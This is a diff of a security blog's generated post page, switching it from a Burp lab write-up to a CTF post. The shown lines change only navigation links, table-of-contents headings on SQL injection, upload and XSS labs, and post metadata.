+        <a href="/2026/07/17/%E6%96%B0%E7%94%9F%E8%B5%9B%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/" aria-label="Prev: 新生赛赛后总结" title="Prev: 新生赛赛后总结"></a>
         <div class="article-nav-caption">Prev</div>
         <h3 class="article-nav-title">
-            ACTF2025
+            新生赛赛后总结
         </h3>
       </div>
     <div class="article-nav-link-wrap right">
-          <img data-src="/covers/castorice-honkai-3840x2160-22114.jpg" data-sizes="auto" alt="SSTI注入" class="lazyload">
-      <a href="/2026/03/13/SSTI%E6%B3%A8%E5%85%A5/" aria-label="Next: SSTI注入"  title="Next: SSTI注入"></a>
+          <img data-src="/covers/3032b6252fa98175d8d46be9a6cdda6e.jpg" data-sizes="auto" alt="ACTF2025" class="lazyload">
+      <a href="/2026/07/14/ACTF2025/" aria-label="Next: ACTF2025"  title="Next: ACTF2025"></a>
       <div class="article-nav-caption">Next</div>
       <h3 class="article-nav-title">
-          SSTI注入
+          ACTF2025
       </h3>
     </div>
   </nav>
@@ -438,8 +374,8 @@
       <nav id="mobile-nav" aria-label="Mobile navigation">
   <div class="sidebar-wrap">
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
-<div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98wp"><span class="toc-number">1.</span> <span class="toc-text"> burp靶场漏洞实战wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%AE%9E%E9%AA%8Cwhere%E6%9D%A1%E6%AC%BE%E4%B8%AD%E5%85%81%E8%AE%B8%E6%A3%80%E7%B4%A2%E9%9A%90%E8%97%8F%E6%95%B0%E6%8D%AE%E7%9A%84sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 1.实验：WHERE条款中允许检索隐藏数据的SQL注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E5%AE%9E%E9%AA%8C%E5%85%81%E8%AE%B8%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E7%9A%84sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 2.实验：允许登录绕过的SQL注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E5%AE%9E%E9%AA%8Csql%E6%B3%A8%E5%85%A5union%E6%94%BB%E5%87%BB%E7%A1%AE%E5%AE%9A%E6%9F%A5%E8%AF%A2%E8%BF%94%E5%9B%9E%E7%9A%84%E5%88%97%E6%95%B0"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 3.实验：SQL注入UNION攻击，确定查询返回的列数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%AE%9E%E9%AA%8C%E5%AE%A4%E9%80%9A%E8%BF%87%E7%BD%91%E9%A1%B5%E5%A3%B3%E4%B8%8A%E4%BC%A0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 1.实验室：通过网页壳上传远程代码执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC"><span class="toc-number">1.3.</span> <span class="toc-text"> 三、跨站脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%AE%9E%E9%AA%8C%E5%B0%86xss%E6%98%A0%E5%B0%84%E5%88%B0html%E4%B8%8A%E4%B8%8B%E6%96%87%E4%B8%AD%E4%B8%94%E6%B2%A1%E6%9C%89%E7%BC%96%E7%A0%81"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 1.实验：将XSS映射到HTML上下文中，且没有编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2dom-xss-%E5%9C%A8-sack-%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%BA%90%E4%BB%A3%E7%A0%81documentwritelocationsearch"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 2.DOM XSS 在 sack 中使用源代码document.write&#96;&#96;location.search</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3dom-xss-in-innerhtml-sink-using-source-locationsearch"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 3.DOM XSS in innerHTML sink using source location.search</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E5%AE%9E%E9%AA%8Cjquery-%E9%94%9A%E5%B1%9E%E6%80%A7%E6%B1%87%E5%85%A5-dom-xss-%E4%BD%BF%E7%94%A8%E6%BA%90%E4%BB%A3%E7%A0%81hreflocationsearch"><span class="toc-number">1.3.4.</span> <span class="toc-text"> 4.实验：jQuery 锚属性汇入 DOM XSS 使用源代码href&#96;&#96;location.search</span></a></li></ol></li></ol></li></ol>
+<div class="sidebar-toc-wrapper toc-div-class" style="display: none" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF"><span class="toc-number">1.</span> <span class="toc-text"> ctfshow菜狗杯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E6%8A%BD%E8%80%81%E5%A9%86"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、抽老婆</span></a></li></ol></li></ol>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -572,13 +508,13 @@
       <script data-pjax>
         window.REIMU_POST = {
           author: "Cl1ck-t0",
-          title: "burp靶场漏洞实战",
-          url: "https://cl1ck-t0.github.io/2026/03/31/burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/",
-          excerpt: "",
+          title: "ctfshow菜狗杯",
+          url: "https://cl1ck-t0.github.io/2026/07/15/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/",
+          excerpt: "前面的区域，以后再来探索吧~",
           description: "",
-          stripContent: " burp靶场漏洞实战wp 之前一直在做各种题库中的题目，偶然得知burp靶场的实验不错，故作次wp，将持续跟进解题进度  一、sql注入  1.实验：WHERE条款中允许检索隐藏数据的SQL注入漏洞 开头一个个看过去，没什么特别的。仔细看发现在Refine your search: 下面点进去url会变为 1https://0ade00b5041780e7808e120800720083.web-security-academy.net/filter?category=Tech+gifts 看",
-          date: "Tue Mar 31 2026 22:06:57 GMT+0800",
-          updated: "Sun Apr 19 2026 16:55:26 GMT+0800",
+          stripContent: "   f966b146caa1d415609f44642f4e58196f1418e3b7963be21f4d1c354da83a7b7689071526c5ea403488143267d49ff10fab16f3558082b89a4a919c0323a291159ad327e27df076d46f8ba971fc4298692f8a71317ac0d33efdcb3f50b820f2b157c533142697282390dc414b9c60ef6e8b0f8d167d2b2bb09a80d",
+          date: "Wed Jul 15 2026 15:51:37 GMT+0800",
+          updated: "Sat Jul 18 2026 10:54:53 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
